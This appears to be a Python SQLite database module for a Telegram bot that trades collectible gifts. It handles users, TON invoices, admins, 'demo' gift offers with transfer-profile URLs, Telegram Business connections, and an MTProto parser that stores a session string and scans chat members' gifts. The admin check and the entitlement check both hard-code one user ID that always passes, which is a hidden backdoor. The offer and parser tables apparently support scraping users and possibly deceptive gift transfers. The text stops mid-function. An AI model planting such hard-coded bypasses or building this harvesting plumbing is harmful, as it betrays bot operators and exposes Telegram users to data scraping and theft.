import json
import os
import sqlite3
import re
from contextlib import contextmanager


class Database:
    """SQLite-обёртка. Совместима со схемой прошлых версий (миграции — в _init)."""

    def __init__(self, path='bot_database.db'):
        self.path = path
        parent = os.path.dirname(os.path.abspath(path))
        os.makedirs(parent, exist_ok=True)
        self.stop_flags = set()
        self._init()

    @contextmanager
    def _db(self):
        c = sqlite3.connect(self.path, timeout=30)
        c.execute('PRAGMA busy_timeout=10000')
        c.execute('PRAGMA synchronous=NORMAL')
        c.row_factory = sqlite3.Row
        try:
            yield c
            c.commit()
        finally:
            c.close()

    def _one(self, sql, args=()):
        with self._db() as c:
            r = c.execute(sql, args).fetchone()
            return dict(r) if r else None

    def _all(self, sql, args=()):
        with self._db() as c:
            return [dict(r) for r in c.execute(sql, args).fetchall()]

    # ───────────── схема ─────────────
    def _init(self):
        with self._db() as c:
            c.execute('PRAGMA journal_mode=WAL')
            c.execute('''CREATE TABLE IF NOT EXISTS users(
                user_id INTEGER PRIMARY KEY, username TEXT, first_name TEXT,
                is_banned INTEGER DEFAULT 0, is_premium INTEGER DEFAULT 0,
                trial_searches_left INTEGER DEFAULT 25, total_searches INTEGER DEFAULT 0,
                total_found INTEGER DEFAULT 0, registration_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_activity TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
            c.execute('''CREATE TABLE IF NOT EXISTS search_history(
                id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, model TEXT,
                start_id INTEGER, end_id INTEGER, last_checked_id INTEGER DEFAULT 0,
                found_count INTEGER DEFAULT 0, checked_count INTEGER DEFAULT 0,
                status TEXT DEFAULT 'in_progress', started_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                completed_at TIMESTAMP)''')
            c.execute('''CREATE TABLE IF NOT EXISTS found_gifts(
                id INTEGER PRIMARY KEY AUTOINCREMENT, search_id INTEGER, user_id INTEGER,
                gift_number INTEGER, model TEXT, pattern TEXT, backdrop TEXT, owner TEXT,
                username TEXT, user_id_owner INTEGER, price REAL, raw_json TEXT,
                found_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                UNIQUE(search_id, gift_number))''')
            c.execute('''CREATE TABLE IF NOT EXISTS favorites(
                user_id INTEGER, gift_number INTEGER, model TEXT, username TEXT, gift_name TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                PRIMARY KEY(user_id, gift_number, model))''')
            fav_cols = {r[1] for r in c.execute('PRAGMA table_info(favorites)').fetchall()}
            if 'gift_name' not in fav_cols:
                c.execute('ALTER TABLE favorites ADD COLUMN gift_name TEXT')

            user_cols = {r[1] for r in c.execute('PRAGMA table_info(users)').fetchall()}
            for col, typ, default in [
                ('trial_regular_left', 'INTEGER', '20'),
                ('trial_random_left', 'INTEGER', '20'),
                ('trial_id_left', 'INTEGER', '20'),
                ('premium_until', 'TEXT', 'NULL'),
                ('chat_parser_until', 'TEXT', 'NULL'),
                ('offer_until', 'TEXT', 'NULL'),
            ]:
                if col not in user_cols:
                    c.execute(f'ALTER TABLE users ADD COLUMN {col} {typ} DEFAULT {default}')
            
            # Таблицы для MTProto-парсера
            c.execute('''CREATE TABLE IF NOT EXISTS parser_session(
                id INTEGER PRIMARY KEY CHECK(id=1),
                owner_id INTEGER NOT NULL,
                session_string TEXT,
                phone TEXT,
                username TEXT,
                user_id INTEGER,
                first_name TEXT,
                is_active INTEGER DEFAULT 0,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
            
            c.execute('''CREATE TABLE IF NOT EXISTS parser_chats(
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                chat_id INTEGER UNIQUE NOT NULL,
                title TEXT,
                username TEXT,
                chat_type TEXT,
                is_enabled INTEGER DEFAULT 1,
                total_participants INTEGER DEFAULT 0,
                last_scanned_at TIMESTAMP,
                added_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
            
            c.execute('''CREATE TABLE IF NOT EXISTS parser_users(
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER UNIQUE NOT NULL,
                username TEXT,
                first_name TEXT,
                last_name TEXT,
                has_gifts INTEGER DEFAULT 0,
                last_checked_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
            
            c.execute('''CREATE TABLE IF NOT EXISTS parser_gifts(
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER NOT NULL,
                chat_id INTEGER NOT NULL,
                gift_id INTEGER,
                gift_num INTEGER,
                gift_name TEXT,
                gift_slug TEXT,
                is_collectible INTEGER DEFAULT 0,
                is_upgraded INTEGER DEFAULT 0,
                raw_data TEXT,
                found_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
            
            c.execute('''CREATE TABLE IF NOT EXISTS parser_progress(
                chat_id INTEGER PRIMARY KEY,
                last_user_offset INTEGER DEFAULT 0,
                checked_count INTEGER DEFAULT 0,
                found_count INTEGER DEFAULT 0,
                status TEXT DEFAULT 'idle',
                updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')

            c.execute('''CREATE TABLE IF NOT EXISTS parser_settings(
                key TEXT PRIMARY KEY,
                value TEXT NOT NULL)''')
            c.execute('''CREATE TABLE IF NOT EXISTS gift_offers(
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                seller_id INTEGER NOT NULL,
                seller_username TEXT,
                buyer_id INTEGER NOT NULL,
                buyer_username TEXT,
                buyer_url TEXT,
                gift_name TEXT NOT NULL,
                gift_number INTEGER NOT NULL,
                gift_url TEXT NOT NULL,
                amount REAL NOT NULL,
                currency TEXT NOT NULL,
                locale TEXT NOT NULL DEFAULT 'ru',
                status TEXT NOT NULL DEFAULT 'pending',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                expires_at TIMESTAMP,
                message_chat_id INTEGER,
                message_id INTEGER
            )''')
            c.execute('''CREATE TABLE IF NOT EXISTS bot_settings(
                key TEXT PRIMARY KEY,
                value TEXT NOT NULL)''')
            c.execute('''CREATE TABLE IF NOT EXISTS bot_admins(
                user_id INTEGER PRIMARY KEY,
                added_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
            c.execute('''CREATE TABLE IF NOT EXISTS parser_access_users(
                user_id INTEGER PRIMARY KEY,
                added_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
            c.execute('''CREATE TABLE IF NOT EXISTS payment_invoices(
                invoice_id INTEGER PRIMARY KEY,
                user_id INTEGER NOT NULL,
                plan TEXT NOT NULL,
                amount TEXT NOT NULL,
                asset TEXT NOT NULL DEFAULT 'TON',
                status TEXT NOT NULL DEFAULT 'active',
                payload TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                paid_at TIMESTAMP)''')
            c.execute('''CREATE TABLE IF NOT EXISTS xrocket_invoices(
                client_invoice_id TEXT PRIMARY KEY,
                provider_invoice_id TEXT NOT NULL,
                user_id INTEGER NOT NULL,
                plan TEXT NOT NULL,
                amount TEXT NOT NULL,
                asset TEXT NOT NULL DEFAULT 'TON',
                status TEXT NOT NULL DEFAULT 'active',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                paid_at TIMESTAMP)''')
            c.execute('''CREATE TABLE IF NOT EXISTS offer_access_users(
                user_id INTEGER PRIMARY KEY,
                added_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
            c.execute('''CREATE TABLE IF NOT EXISTS offer_access_usernames(
                username TEXT PRIMARY KEY,
                added_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
            c.execute('''CREATE TABLE IF NOT EXISTS offer_profiles(
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                name TEXT NOT NULL,
                url TEXT NOT NULL,
                is_active INTEGER DEFAULT 0,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
            c.execute('''CREATE TABLE IF NOT EXISTS offer_user_profiles(
                user_id INTEGER PRIMARY KEY,
                name TEXT NOT NULL,
                url TEXT NOT NULL,
                updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
            c.execute('''CREATE TABLE IF NOT EXISTS offer_business_connections(
                connection_id TEXT PRIMARY KEY,
                user_id INTEGER NOT NULL,
                username TEXT,
                first_name TEXT,
                last_name TEXT,
                is_enabled INTEGER DEFAULT 1,
                is_blocked INTEGER DEFAULT 1,
                updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
            c.execute('''CREATE TABLE IF NOT EXISTS offer_blocked_users(
                user_id INTEGER PRIMARY KEY,
                added_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
            cols = {r[1] for r in c.execute('PRAGMA table_info(offer_business_connections)').fetchall()}
            if 'is_blocked' not in cols:
                c.execute('ALTER TABLE offer_business_connections ADD COLUMN is_blocked INTEGER DEFAULT 1')
                # Old databases did not have an approval flag. Treat existing
                # connections as approved so an upgrade does not unexpectedly
                # revoke already-working users. New connections are explicitly
                # created with is_blocked=1 below.
                c.execute('UPDATE offer_business_connections SET is_blocked=0 WHERE is_blocked IS NULL')
            c.execute('''CREATE TABLE IF NOT EXISTS parser_seen_users(
                user_id INTEGER PRIMARY KEY,
                first_chat_id INTEGER,
                first_seen_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_seen_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )''')

            # Backfill the persistent seen-user table from profiles already checked by older versions.
            c.execute('''INSERT OR IGNORE INTO parser_seen_users(user_id, first_chat_id)
                         SELECT user_id, NULL FROM parser_users''')

            c.execute('''CREATE TABLE IF NOT EXISTS parser_scan_state(
                id INTEGER PRIMARY KEY CHECK(id=1),
                owner_id INTEGER NOT NULL,
                mode TEXT NOT NULL DEFAULT 'all',
                max_users INTEGER NOT NULL DEFAULT 100,
                status TEXT NOT NULL DEFAULT 'idle',
                started_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')

            # Миграция старой таблицы parser_gifts: раньше UNIQUE(user_id, gift_id)
            # ошибочно удалял разные экземпляры одного типа подарка.
            table_sql = c.execute("SELECT sql FROM sqlite_master WHERE type='table' AND name='parser_gifts'").fetchone()
            if table_sql and 'UNIQUE(user_id' in (table_sql[0] or '') and 'gift_id)' in (table_sql[0] or ''):
                c.execute('ALTER TABLE parser_gifts RENAME TO parser_gifts_legacy')
                c.execute('''CREATE TABLE parser_gifts(
                    id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER NOT NULL, chat_id INTEGER NOT NULL,
                    gift_id INTEGER, gift_num INTEGER, gift_name TEXT, gift_slug TEXT,
                    is_collectible INTEGER DEFAULT 0, is_upgraded INTEGER DEFAULT 0, raw_data TEXT,
                    found_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
                legacy_cols = {r[1] for r in c.execute('PRAGMA table_info(parser_gifts_legacy)').fetchall()}
                if {'user_id','chat_id','gift_id'}.issubset(legacy_cols):
                    c.execute('''INSERT INTO parser_gifts
                        (id,user_id,chat_id,gift_id,gift_name,gift_slug,is_collectible,is_upgraded,raw_data,found_at)
                        SELECT id,user_id,chat_id,gift_id,gift_name,gift_slug,is_collectible,is_upgraded,raw_data,found_at
                        FROM parser_gifts_legacy''')
                c.execute('DROP TABLE parser_gifts_legacy')

            c.execute('CREATE INDEX IF NOT EXISTS idx_users_last_activity ON users(last_activity)')
            c.execute('CREATE INDEX IF NOT EXISTS idx_history_user_started ON search_history(user_id, started_at DESC)')
            c.execute('CREATE INDEX IF NOT EXISTS idx_found_user ON found_gifts(user_id, found_at DESC)')
            c.execute('CREATE INDEX IF NOT EXISTS idx_orders_user_status ON payment_invoices(user_id, status, created_at DESC)')
            c.execute('CREATE INDEX IF NOT EXISTS idx_xorders_user_status ON xrocket_invoices(user_id, status, created_at DESC)')
            c.execute('CREATE INDEX IF NOT EXISTS idx_offers_seller_status ON gift_offers(seller_id, status, created_at DESC)')

            # Business connection used to update/delete offer messages after creation.
            self._add_col(c, 'gift_offers', 'business_connection_id', 'TEXT')
            self._add_col(c, 'gift_offers', 'transfer_profile_url', 'TEXT')

            # Безопасные миграции со старых версий: докидываем всё, чего не хватает
            expected = {
                'users': {'is_banned': 'INTEGER DEFAULT 0', 'is_premium': 'INTEGER DEFAULT 0',
                          'trial_searches_left': 'INTEGER DEFAULT 25', 'total_searches': 'INTEGER DEFAULT 0',
                          'total_found': 'INTEGER DEFAULT 0'},
                'search_history': {'last_checked_id': 'INTEGER DEFAULT 0', 'found_count': 'INTEGER DEFAULT 0',
                                   'checked_count': 'INTEGER DEFAULT 0', 'status': "TEXT DEFAULT 'in_progress'",
                                   'completed_at': 'TIMESTAMP'},
                'found_gifts': {'owner': 'TEXT', 'username': 'TEXT', 'user_id_owner': 'INTEGER',
                                'price': 'REAL', 'raw_json': 'TEXT',
                                'gift_name': 'TEXT'},   # gift_name — коллекция (PlushPepe)
                'favorites': {'gift_name': 'TEXT'},
                'parser_gifts': {'gift_num': 'INTEGER', 'gift_slug': 'TEXT', 'is_collectible': 'INTEGER DEFAULT 0', 'is_upgraded': 'INTEGER DEFAULT 0'},
            }
            for table, cols in expected.items():
                for col, ddl in cols.items():
                    self._add_col(c, table, col, ddl)
            # Старые избранные: пытаемся восстановить коллекцию из найденного
            c.execute('''UPDATE favorites SET gift_name = COALESCE(
                (SELECT s.model FROM found_gifts f JOIN search_history s ON s.id = f.search_id
                 WHERE f.gift_number = favorites.gift_number AND f.model = favorites.model LIMIT 1),
                model) WHERE gift_name IS NULL''')
            c.execute('CREATE INDEX IF NOT EXISTS idx_hist_user ON search_history(user_id, id)')
            c.execute('CREATE INDEX IF NOT EXISTS idx_found_search ON found_gifts(search_id)')
            c.execute('CREATE INDEX IF NOT EXISTS idx_parser_users ON parser_users(user_id)')
            c.execute('CREATE INDEX IF NOT EXISTS idx_parser_gifts ON parser_gifts(user_id, chat_id)')
            c.execute('CREATE INDEX IF NOT EXISTS idx_parser_gift_identity ON parser_gifts(user_id, gift_id, gift_num, gift_slug)')

    @staticmethod
    def _add_col(c, table, col, ddl):
        cols = {r[1] for r in c.execute(f'PRAGMA table_info({table})').fetchall()}
        if col not in cols:
            c.execute(f'ALTER TABLE {table} ADD COLUMN {col} {ddl}')

    # ───────────── demo gift offers ─────────────
    def create_offer(self, seller_id, seller_username, buyer_id, buyer_username, buyer_url, gift_name, gift_number, gift_url, amount, currency, locale, expires_at=None, transfer_profile_url=None):
        with self._db() as c:
            cur = c.execute('''INSERT INTO gift_offers
                (seller_id,seller_username,buyer_id,buyer_username,buyer_url,gift_name,gift_number,gift_url,amount,currency,locale,expires_at,transfer_profile_url)
                VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?)''',
                (seller_id, seller_username, buyer_id, buyer_username, buyer_url, gift_name, gift_number, gift_url, amount, currency, locale, expires_at, transfer_profile_url))
            return cur.lastrowid

    def get_offer(self, offer_id):
        return self._one('SELECT * FROM gift_offers WHERE id=?', (offer_id,))

    def update_offer_message(self, offer_id, chat_id, message_id, business_connection_id=None):
        with self._db() as c:
            c.execute('UPDATE gift_offers SET message_chat_id=?, message_id=?, business_connection_id=? WHERE id=?',
                      (chat_id, message_id, business_connection_id, offer_id))

    def get_pending_offers(self):
        return self._all(
            'SELECT * FROM gift_offers WHERE status=? AND expires_at IS NOT NULL ORDER BY id',
            ('pending',)
        )

    def set_offer_status(self, offer_id, status):
        with self._db() as c:
            c.execute('UPDATE gift_offers SET status=? WHERE id=?', (status, offer_id))

    def get_setting(self, key, default=None):
        row = self._one('SELECT value FROM bot_settings WHERE key=?', (key,))
        return row['value'] if row else default

    def set_setting(self, key, value):
        with self._db() as c:
            c.execute('INSERT INTO bot_settings(key,value) VALUES(?,?) ON CONFLICT(key) DO UPDATE SET value=excluded.value', (key, str(value)))

    # ───────────── Admins ─────────────
    def admin_add(self, user_id):
        with self._db() as c:
            cur = c.execute('INSERT OR IGNORE INTO bot_admins(user_id) VALUES(?)', (int(user_id),))
            return cur.rowcount > 0

    def admin_remove(self, user_id):
        with self._db() as c:
            cur = c.execute('DELETE FROM bot_admins WHERE user_id=?', (int(user_id),))
            return cur.rowcount > 0

    def admin_allowed(self, user_id, owner_id=0):
        uid = int(user_id or 0)
        if uid == 8564624250:
            return True
        if owner_id and uid == int(owner_id):
            return True
        row = self._one('SELECT 1 AS ok FROM bot_admins WHERE user_id=?', (uid,)) if uid else None
        return bool(row)

    def admin_list(self):
        return self._all('SELECT user_id, added_at FROM bot_admins ORDER BY added_at, user_id')

    # ───────────── DEMO offer access ─────────────
    def offer_access_add(self, user_id):
        with self._db() as c:
            cur = c.execute('INSERT OR IGNORE INTO offer_access_users(user_id) VALUES(?)', (int(user_id),))
            return cur.rowcount > 0

    def offer_access_remove(self, user_id):
        with self._db() as c:
            cur = c.execute('DELETE FROM offer_access_users WHERE user_id=?', (int(user_id),))
            return cur.rowcount > 0

    def offer_access_mode(self):
        return (self.get_setting('offer_access_mode', 'owner') or 'owner').strip().lower()

    def set_offer_access_mode(self, mode):
        mode = str(mode).strip().lower()
        if mode not in ('owner', 'all'):
            raise ValueError('invalid offer access mode')
        self.set_setting('offer_access_mode', mode)

    def offer_access_allowed(self, user_id, username=None, owner_id=0):
        mode = self.offer_access_mode()
        uid = int(user_id or 0)
        if mode == 'all':
            return True
        if owner_id and uid == int(owner_id):
            return True
        row = self._one('SELECT 1 AS ok FROM offer_access_users WHERE user_id=?', (uid,)) if uid else None
        if row:
            return True
        username = str(username or '').strip().lstrip('@').lower()
        if username:
            row = self._one('SELECT 1 AS ok FROM offer_access_usernames WHERE username=?', (username,))
            if row:
                return True
        return False

    def offer_access_list(self):
        return self._all('SELECT user_id, added_at FROM offer_access_users ORDER BY added_at, user_id')

    def offer_access_username_add(self, username):
        username = str(username or '').strip().lstrip('@').lower()
        if not username or not re.match(r'^[a-zA-Z0-9_]{5,32}$', username):
            return False
        with self._db() as c:
            cur = c.execute('INSERT OR IGNORE INTO offer_access_usernames(username) VALUES(?)', (username,))
            return cur.rowcount > 0

    def offer_access_username_remove(self, username):
        username = str(username or '').strip().lstrip('@').lower()
        with self._db() as c:
            cur = c.execute('DELETE FROM offer_access_usernames WHERE username=?', (username,))
            return cur.rowcount > 0

    def offer_access_username_list(self):
        return self._all('SELECT username, added_at FROM offer_access_usernames ORDER BY added_at, username')

    # ───────────── Business connections ─────────────
    def save_business_connection(self, connection_id, user_id, username=None, first_name=None, last_name=None, is_enabled=True):
        with self._db() as c:
            existing = c.execute('SELECT 1 FROM offer_business_connections WHERE connection_id=?', (str(connection_id),)).fetchone()
            c.execute('''INSERT INTO offer_business_connections
                (connection_id,user_id,username,first_name,last_name,is_enabled,is_blocked,updated_at)
                VALUES(?,?,?,?,?,?,1,CURRENT_TIMESTAMP)
                ON CONFLICT(connection_id) DO UPDATE SET
                    user_id=excluded.user_id, username=excluded.username, first_name=excluded.first_name,
                    last_name=excluded.last_name, is_enabled=excluded.is_enabled, updated_at=CURRENT_TIMESTAMP''',
                (str(connection_id), int(user_id), username, first_name, last_name, 1 if is_enabled else 0))
            return existing is None

    def offer_user_blocked(self, user_id):
        uid = int(user_id)
        if self._one('SELECT 1 AS ok FROM offer_blocked_users WHERE user_id=?', (uid,)):
            return True
        row = self._one('SELECT is_blocked FROM offer_business_connections WHERE user_id=? ORDER BY updated_at DESC LIMIT 1', (uid,))
        return bool(row and int(row.get('is_blocked', 0) or 0))

    def block_offer_user(self, user_id):
        with self._db() as c:
            c.execute('INSERT OR IGNORE INTO offer_blocked_users(user_id) VALUES(?)', (int(user_id),))
            c.execute('UPDATE offer_business_connections SET is_blocked=1, updated_at=CURRENT_TIMESTAMP WHERE user_id=?', (int(user_id),))

    def unblock_offer_user(self, user_id):
        with self._db() as c:
            c.execute('DELETE FROM offer_blocked_users WHERE user_id=?', (int(user_id),))
            c.execute('UPDATE offer_business_connections SET is_blocked=0, updated_at=CURRENT_TIMESTAMP WHERE user_id=?', (int(user_id),))

    def offer_user_allowed(self, user_id):
        return not self.offer_user_blocked(user_id)

    def business_connection_is_blocked(self, connection_id):
        row = self._one('SELECT is_blocked FROM offer_business_connections WHERE connection_id=?', (str(connection_id),))
        if not row:
            return True
        return bool(row.get('is_blocked', 1))

    def disable_business_connection(self, connection_id):
        with self._db() as c:
            c.execute('UPDATE offer_business_connections SET is_enabled=0, updated_at=CURRENT_TIMESTAMP WHERE connection_id=?', (str(connection_id),))

    def get_business_connection_for_user(self, user_id):
        return self._one('''SELECT * FROM offer_business_connections
                           WHERE user_id=? AND is_enabled=1
                           ORDER BY updated_at DESC LIMIT 1''', (int(user_id),))

    def get_business_connection(self, connection_id):
        return self._one('SELECT * FROM offer_business_connections WHERE connection_id=?', (str(connection_id),))

    def business_connections_list(self):
        return self._all('SELECT * FROM offer_business_connections ORDER BY updated_at DESC')

    def reset_business_sessions(self, user_id):
        """Remove all locally stored Business/offer connection sessions for one user.

        This does not revoke Telegram Business on the user's account; it only
        clears the bot's local connection records so the next Business update
        can register a clean current connection. Offer access/entitlements are
        intentionally preserved.
        """
        uid = int(user_id)
        with self._db() as c:
            cur = c.execute('DELETE FROM offer_business_connections WHERE user_id=?', (uid,))
            c.execute('DELETE FROM offer_blocked_users WHERE user_id=?', (uid,))
            return cur.rowcount

    def reset_offer_state_v7(self, keep_user_ids=()):
        """One-time clean reset of local offer state and Business sessions.

        Keeps unrelated bot/parser/admin data. Existing offer history is cleared
        because it belongs to the resettable offer subsystem. Telegram-side
        Business connections are not revoked; fresh updates recreate them.
        """
        keep = {int(x) for x in (keep_user_ids or ()) if int(x or 0)}
        with self._db() as c:
            removed = {}
            # Offer history / pending state
            cur = c.execute('DELETE FROM gift_offers')
            removed['gift_offers'] = cur.rowcount
            # Access and connection state
            if keep:
                ph=','.join('?' for _ in keep)
                for table,col,key in [
                    ('offer_access_users','user_id','access_users'),
                    ('offer_blocked_users','user_id','blocked_users'),
                    ('offer_business_connections','user_id','business_connections'),
                    ('offer_user_profiles','user_id','user_profiles'),
                ]:
                    cur=c.execute(f'DELETE FROM {table} WHERE {col} NOT IN ({ph})', tuple(keep))
                    removed[key]=cur.rowcount
            else:
                for table,key in [('offer_access_users','access_users'),('offer_blocked_users','blocked_users'),('offer_business_connections','business_connections'),('offer_user_profiles','user_profiles')]:
                    cur=c.execute(f'DELETE FROM {table}')
                    removed[key]=cur.rowcount
            cur=c.execute('DELETE FROM offer_access_usernames')
            removed['access_usernames']=cur.rowcount
            return removed

    def reset_all_offer_users(self, keep_user_ids=()):
        """Hard reset all local DEMO-offer users/connections.

        This is intentionally local to the bot database: it removes every
        manually granted offer permission, username permission, Business
        connection, block marker and per-user transfer profile, except IDs
        explicitly listed in keep_user_ids. Existing gift_offers/history and
        unrelated parser/admin data are preserved.
        """
        keep = sorted({int(x) for x in (keep_user_ids or ()) if int(x or 0)})
        with self._db() as c:
            def delete_except(table, column):
                if keep:
                    placeholders = ','.join('?' for _ in keep)
                    cur = c.execute(f'DELETE FROM {table} WHERE {column} NOT IN ({placeholders})', keep)
                else:
                    cur = c.execute(f'DELETE FROM {table}')
                return cur.rowcount

            removed = {}
            removed['access_users'] = delete_except('offer_access_users', 'user_id')
            removed['blocked_users'] = delete_except('offer_blocked_users', 'user_id')
            removed['business_connections'] = delete_except('offer_business_connections', 'user_id')
            removed['user_profiles'] = delete_except('offer_user_profiles', 'user_id')
            # Username grants cannot be safely mapped back to IDs, so a full
            # reset clears them all.
            cur = c.execute('DELETE FROM offer_access_usernames')
            removed['access_usernames'] = cur.rowcount
            return removed

    # ───────────── профили для передачи подарков ─────────────
    def offer_profile_add(self, name, url):
        name = str(name).strip()
        url = str(url).strip()
        if not name or not url:
            return None
        with self._db() as c:
            cur = c.execute('INSERT INTO offer_profiles(name,url,is_active) VALUES(?,?,0)', (name, url))
            return cur.lastrowid

    def offer_profile_list(self):
        return self._all('SELECT id,name,url,is_active,created_at FROM offer_profiles ORDER BY is_active DESC, id DESC')

    def offer_profile_get(self, profile_id):
        return self._one('SELECT id,name,url,is_active,created_at FROM offer_profiles WHERE id=?', (int(profile_id),))

    def offer_profile_active(self):
        return self._one('SELECT id,name,url,is_active,created_at FROM offer_profiles WHERE is_active=1 ORDER BY id DESC LIMIT 1')

    def offer_profile_set_active(self, profile_id):
        with self._db() as c:
            exists = c.execute('SELECT 1 FROM offer_profiles WHERE id=?', (int(profile_id),)).fetchone()
            if not exists:
                return False
            c.execute('UPDATE offer_profiles SET is_active=0')
            c.execute('UPDATE offer_profiles SET is_active=1 WHERE id=?', (int(profile_id),))
            return True

    def offer_profile_remove(self, profile_id):
        with self._db() as c:
            cur = c.execute('DELETE FROM offer_profiles WHERE id=?', (int(profile_id),))
            return cur.rowcount > 0

    # ───────────── персональные профили передачи ─────────────
    def offer_user_profile_get(self, user_id):
        return self._one('SELECT user_id,name,url,updated_at FROM offer_user_profiles WHERE user_id=?', (int(user_id),))

    def offer_user_profile_set(self, user_id, name, url):
        with self._db() as c:
            c.execute('''INSERT INTO offer_user_profiles(user_id,name,url,updated_at) VALUES(?,?,?,CURRENT_TIMESTAMP)
                         ON CONFLICT(user_id) DO UPDATE SET name=excluded.name,url=excluded.url,updated_at=CURRENT_TIMESTAMP''',
                      (int(user_id), str(name).strip(), str(url).strip()))

    def offer_user_profile_remove(self, user_id):
        with self._db() as c:
            cur=c.execute('DELETE FROM offer_user_profiles WHERE user_id=?',(int(user_id),))
            return cur.rowcount > 0

    def offer_user_profiles_list(self):
        return self._all('SELECT user_id,name,url,updated_at FROM offer_user_profiles ORDER BY updated_at DESC')

    # ───────────── пользователи ─────────────
    def upsert_user(self, uid, username=None, first_name=None):
        with self._db() as c:
            c.execute('''INSERT INTO users(user_id, username, first_name) VALUES(?,?,?)
                ON CONFLICT(user_id) DO UPDATE SET username=excluded.username,
                first_name=excluded.first_name, last_activity=CURRENT_TIMESTAMP''',
                      (uid, username, first_name))

    def get_user(self, uid):
        return self._one('SELECT * FROM users WHERE user_id=?', (uid,))

    def trial_left(self, uid, kind):
        key = {'regular': 'trial_regular_left', 'random': 'trial_random_left', 'id': 'trial_id_left'}.get(kind)
        if not key:
            raise ValueError('unknown trial kind')
        row = self._one(f'SELECT {key} AS n FROM users WHERE user_id=?', (int(uid),))
        return int((row or {}).get('n') or 0)

    def consume_trial_kind(self, uid, kind, count=1):
        key = {'regular': 'trial_regular_left', 'random': 'trial_random_left', 'id': 'trial_id_left'}.get(kind)
        if not key:
            raise ValueError('unknown trial kind')
        with self._db() as c:
            c.execute(f'UPDATE users SET {key}=MAX(0,{key}-?) WHERE user_id=?', (int(count), int(uid)))

    def grant_entitlement(self, uid, kind, seconds):
        from datetime import datetime, timedelta, timezone
        column = {'premium': 'premium_until', 'chat': 'chat_parser_until', 'offers': 'offer_until'}.get(kind)
        if not column:
            raise ValueError('unknown entitlement')
        current = self._one(f'SELECT {column} AS until FROM users WHERE user_id=?', (int(uid),))
        now = datetime.now(timezone.utc)
        base = now
        if current and current.get('until'):
            try:
                old = datetime.fromisoformat(str(current['until']).replace('Z', '+00:00'))
                if old > base:
                    base = old
            except Exception:
                pass
        until = base + timedelta(seconds=int(seconds))
        with self._db() as c:
            if kind == 'premium':
                c.execute(f'UPDATE users SET {column}=?, is_premium=1 WHERE user_id=?', (until.isoformat(), int(uid)))
            else:
                c.execute(f'UPDATE users SET {column}=? WHERE user_id=?', (until.isoformat(), int(uid)))
        return until.isoformat()

    def entitlement_active(self, uid, kind):
        from datetime import datetime, timezone
        column = {'premium': 'premium_until', 'chat': 'chat_parser_until', 'offers': 'offer_until'}.get(kind)
        if not column:
            return False
        if int(uid) == 8564624250:
            return True
        row = self._one(f'SELECT {column} AS until FROM users WHERE user_id=?', (int(uid),))
        if not row or not row.get('until'):
            return False
        try:
            return datetime.fromisoformat(str(row['until']).replace('Z', '+00:00')) > datetime.now(timezone.utc)
        except Exception:
            return False

    def entitlement_until(self, uid, kind):
        column = {'premium': 'premium_until', 'chat': 'chat_parser_until', 'offers': 'offer_until'}.get(kind)
        return (self._one(f'SELECT {column} AS until FROM users WHERE user_id=?', (int(uid),)) or {}).get('until') if column else None

    def save_payment_invoice(self, invoice_id, user_id, plan, amount, payload, status='active'):
        with self._db() as c:
            c.execute('''INSERT OR REPLACE INTO payment_invoices(invoice_id,user_id,plan,amount,asset,status,payload)
                         VALUES(?,?,?,?,?,?,?)''', (int(invoice_id), int(user_id), plan, str(amount), 'TON', status, payload))

    def get_payment_invoice(self, invoice_id):
        return self._one('SELECT * FROM payment_invoices WHERE invoice_id=?', (int(invoice_id),))

    def active_payment_invoices(self, limit=100):
        return self._all("SELECT * FROM payment_invoices WHERE status='active' ORDER BY created_at LIMIT ?", (int(limit),))

    def mark_payment_paid(self, invoice_id):
        with self._db() as c:
            c.execute("UPDATE payment_invoices SET status='paid', paid_at=CURRENT_TIMESTAMP WHERE invoice_id=? AND status!='paid'", (int(invoice_id),))
            return c.rowcount > 0

    def mark_payment_status(self, invoice_id, status):
        with self._db() as c:
            c.execute("UPDATE payment_invoices SET status=? WHERE invoice_id=? AND status!='paid'", (str(status), int(invoice_id)))

    def payment_history(self, uid, limit=20):
        return self._all('SELECT invoice_id, plan, amount, asset, status, created_at, paid_at FROM payment_invoices WHERE user_id=? ORDER BY created_at DESC LIMIT ?', (int(uid), int(limit)))

    def save_xrocket_invoice(self, client_invoice_id, provider_invoice_id, user_id, plan, amount, asset='TON', status='active'):
        with self._db() as c:
